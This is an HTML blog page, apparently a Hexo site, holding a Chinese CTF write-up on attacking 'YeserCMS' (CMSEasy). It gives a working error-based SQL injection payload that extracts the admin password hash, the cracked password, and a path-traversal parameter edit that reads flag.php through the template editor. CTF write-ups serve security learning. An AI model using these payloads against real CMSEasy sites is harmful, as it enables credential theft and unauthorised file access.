@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Yeser-CMS漏洞利用 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="刚刚做了一道“百度杯”CTF比赛 九月场中的CMS题目，这里拿出来分享一下  题目内容：新的CMS系统，帮忙测测是否有漏洞。tips:flag在网站根目录下的flag.php中">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Yeser-CMS漏洞利用">
+<meta property="og:url" content="http://yoursite.com/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="刚刚做了一道“百度杯”CTF比赛 九月场中的CMS题目，这里拿出来分享一下  题目内容：新的CMS系统，帮忙测测是否有漏洞。tips:flag在网站根目录下的flag.php中">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/1.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/3.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/4.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/5.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/6.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/7.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/8.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/9.png">
+<meta property="article:published_time" content="2018-09-20T09:47:42.000Z">
+<meta property="article:modified_time" content="2019-12-30T10:31:51.362Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CMS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Yeser-CMS漏洞利用" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="article-date">
+  <time datetime="2018-09-20T09:47:42.000Z" itemprop="datePublished">2018-09-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Yeser-CMS漏洞利用
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>刚刚做了一道“百度杯”CTF比赛 九月场中的CMS题目，这里拿出来分享一下</p>
+<blockquote>
+<p>题目内容：新的CMS系统，帮忙测测是否有漏洞。<br>tips:flag在网站根目录下的flag.php中</p>
+</blockquote>
+<a id="more"></a>
+<p>首先去百度了一下，是没有这个cms的，那么看一下这个网站看有没有有用的信息<br>我看先看一下这个文件：<code>http://0b572aacb0994d6fb941349a346cae04c9d7fafc8afd42b6.game.ichunqiu.com/robots.txt</code><br>这个文件的作用是告诉我们哪些网站能爬，哪些不饿能爬，不过它里面有时候会放一些重要的东西</p>
+<p>页面显示如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line"># robots.txt for YeserCMS</span><br><span class="line"># Version 5.0.0</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">User-agent: *</span><br><span class="line"></span><br><span class="line">Disallow:&#x2F;admin&#x2F;</span><br><span class="line">Disallow:&#x2F;cache&#x2F;</span><br><span class="line">Disallow:&#x2F;common&#x2F;</span><br><span class="line">Disallow:&#x2F;config&#x2F;</span><br><span class="line">Disallow:&#x2F;fckeditor&#x2F;</span><br><span class="line">Disallow:&#x2F;htaccess&#x2F;</span><br><span class="line">Disallow:&#x2F;images&#x2F;</span><br><span class="line">Disallow:&#x2F;install&#x2F;</span><br><span class="line">Disallow:&#x2F;js&#x2F;</span><br><span class="line">Disallow:&#x2F;lib&#x2F;</span><br><span class="line">Disallow:&#x2F;template&#x2F;</span><br><span class="line">Disallow:&#x2F;upload&#x2F;</span><br><span class="line">Disallow:&#x2F;celive&#x2F;</span><br><span class="line">Disallow:flag.php</span><br></pre></td></tr></table></figure><br>可以好几个比较重要的目录和文件</p>
+<p>先放到这，然后我们继续寻找有用的信息<br>在文档下载页面，随便点一个文档进去，拉到最下面的评论区可以在我要评论里面看到网站的框架是CMSEASY<br><img src="Yeser-CMS漏洞利用/1.png" alt=""></p>
+<pre><code>百度了一下CMSeasy，发现这确实是一个CMS，而且是有漏洞的
+https://www.seebug.org/appdir/CmsEasy
+使用无限制报错注入
+https://www.seebug.org/vuldb/ssvid-94084
+</code></pre><p>这个网站存在报错注入，大概思路就是：<br>通过报错注入获得管理员用户名和密码<br>然后通过上边的<code>robots.txt</code>我们可以看到后台目录是：<code>/admin/</code><br>我们直接登陆后台，漏洞在后台页面上</p>
+<p>接下来的问题就是如何获得用户名和密码，通过上边这篇文档提供的方法，直接把payload拿来用了：<br>存在注入漏洞的页面是：<code>url/celive/live/header.php</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">那么我们访问这个页面，同时postdata:xajax&#x3D;Postdata&amp;xajaxargs[0]&#x3D;&lt;xjxquery&gt;&lt;q&gt;detail&#x3D;xxxxxx&#39;,(UpdateXML(1,CONCAT(0x5b,substring((SELECT&#x2F;**&#x2F;GROUP_CONCAT(username,password) from yesercms_user),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;&#x2F;q&gt;&lt;&#x2F;xjxquery&gt;</span><br></pre></td></tr></table></figure><br>这样确实得到了回显，有用户名，但是密码好像是不全的<br><img src="Yeser-CMS漏洞利用/2.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">接下来直接只查看完整的密码的md5</span><br><span class="line">xajax&#x3D;Postdata&amp;xajaxargs[0]&#x3D;&lt;xjxquery&gt;&lt;q&gt;detail&#x3D;xxxxxx%2527%252c(UpdateXML(1%252cCONCAT(0x5b%252csubstring((SELECT%252f**%252fGROUP_CONCAT(username%252cpassword)%2bfrom%2byesercms_user)%252c7%252c39)%252c0x5d)%252c1))%252cNULL%252cNULL%252cNULL%252cNULL%252cNULL%252cNULL)--%2b&lt;&#x2F;q&gt;&lt;&#x2F;xjxquery&gt;</span><br><span class="line"></span><br><span class="line">页面返回如下</span><br><span class="line">XPATH syntax error: &#39;[f512d4240cbbdeafada404677ccbe61&#39;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;INSERT INTO &#96;yesercms_detail&#96; (&#96;chatid&#96;,&#96;detail&#96;,&#96;who_witter&#96;) VALUES(&#39;&#39;,&#39;xxxxxx&#39;,(UpdateXML(1,CONCAT(0x5b,substring((SELECT&#x2F;**&#x2F;GROUP_CONCAT(username,password) from yesercms_user),7,39),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)--  (2018-08-13 16:22:21)&#39;,&#39;2&#39;)</span><br></pre></td></tr></table></figure>
+<p><img src="Yeser-CMS漏洞利用/3.png" alt=""><br>然后就知道了</p>
+<pre><code>用户名admin，密码ff512d4240cbbdeafada404677ccbe61，md5解密为Yeser231。
+</code></pre><p>这里推荐一个md5在线解码网站，可以直接解出来这个值：<code>http://www.dmd5.com/md5-decrypter.jsp</code><br>然后我们就可以进入后台了，在后台直接登陆就行</p>
+<p><img src="Yeser-CMS漏洞利用/4.png" alt=""></p>
+<p>登陆后就进入了后台<br>还是查看的别人的文章，CMSeasy在后台有一个任意文件查看的漏洞<br>我们点击<code>模板</code>，然后选择<code>当前模板编辑</code>，然后抓个包，点击编辑<br><img src="Yeser-CMS漏洞利用/5.png" alt=""><br><img src="Yeser-CMS漏洞利用/6.png" alt=""><br><img src="Yeser-CMS漏洞利用/7.png" alt=""><br>在包的最下边会看到：<code>&amp;id=#footer_html</code>这个东西<br><img src="Yeser-CMS漏洞利用/8.png" alt=""></p>
+<p>把它修改成<code>&amp;id=../../flag.php</code><br>这就是任意文件查看漏洞<br>之后发送包，我们要的flag就出来了<br><img src="Yeser-CMS漏洞利用/9.png" alt=""></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" data-id="ck4sb1gg10001zkuycvydgfe5" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CMS/" rel="tag">CMS</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          再见CMS--齐博CMS
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/09/11/%E7%A5%9E%E5%99%A8dvcs-ripper/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">神器dvcs-ripper</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CMS/" rel="tag">CMS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%94%BB%E9%98%B2/" rel="tag">攻防</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CMS/" style="font-size: 20px;">CMS</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/docker/" style="font-size: 10px;">docker</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/%E6%94%BB%E9%98%B2/" style="font-size: 10px;">攻防</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/11/15/PHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/">PHP特性总结</a>
+          </li>
+        
+          <li>
+            <a href="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/">2018WEB安全测试秋季预选赛</a>
+          </li>
+        
+          <li>
+            <a href="/2018/10/19/%E6%B5%B7%E6%B4%8BCMS/">海洋CMS</a>
+          </li>
+        
+          <li>
+            <a href="/2018/10/05/docker%E5%BF%83%E5%BE%97/">docker心得</a>
+          </li>
+        
+          <li>
+            <a href="/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/">再见CMS--齐博CMS</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
